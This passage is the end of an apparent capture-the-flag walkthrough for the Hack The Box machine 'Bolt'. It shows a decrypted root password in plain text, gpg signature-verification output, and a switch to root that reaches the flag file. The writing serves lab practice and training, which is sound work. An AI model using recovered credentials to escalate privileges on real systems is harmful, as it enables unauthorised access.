{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Sat 06 Mar 2021 10:33:54 AM EST
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
```

Switch user to `root` and grab the system flag from `/root/root.txt` to complete the machine.

```bash
eddie@bolt:~$ su root
Password:
root@bolt:/home/eddie# cd
root@bolt:/root# id
uid=0(root) gid=0(root) groups=0(root)
root@bolt:/root# ls -la /root/root.txt
-r-------- 1 root root 33 Feb 21 17:07 /root/root.txt
```
